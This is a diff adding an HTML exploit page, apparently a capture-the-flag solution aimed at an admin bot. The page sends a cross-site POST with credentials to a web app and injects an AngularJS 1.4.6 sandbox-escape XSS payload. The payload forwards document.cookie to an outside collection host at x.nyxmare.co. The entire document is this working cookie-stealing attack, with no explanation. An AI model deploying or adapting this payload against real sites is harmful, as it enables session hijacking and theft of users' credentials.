@@ -1,0 +1,25 @@
+<img src="//x.nyxmare.co/sleep.php">
+<body>
+    <script>
+        // 
+        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+        const url = "https://webapp:8000"
+        const hook = `https://x.nyxmare.co:1234/cookies`
+        async function main() {
+            window.open(`${url}/check`)
+            await sleep(1000)
+            await fetch(`${url}/api`, {
+                method:"post",
+                mode:"no-cors",
+                credentials:"include",
+                headers:{
+                    "Content-Type":"text/plain; application/json",
+                },
+                body: `{"name":"\\u003cscript src=\\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\\"\\u003e\\u003c/script\\u003e\\u003cdiv ng-app\\u003e {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };window.location.href=\\"${hook}?frombot_=1&\\"+encodeURIComponent(document.cookie);//');}} \\u003c/div\\u003e"}`
+            })
+            await sleep(1000)
+            window.open(`${url}/check`)
+        }
+        main()
+    </script>
+</body>
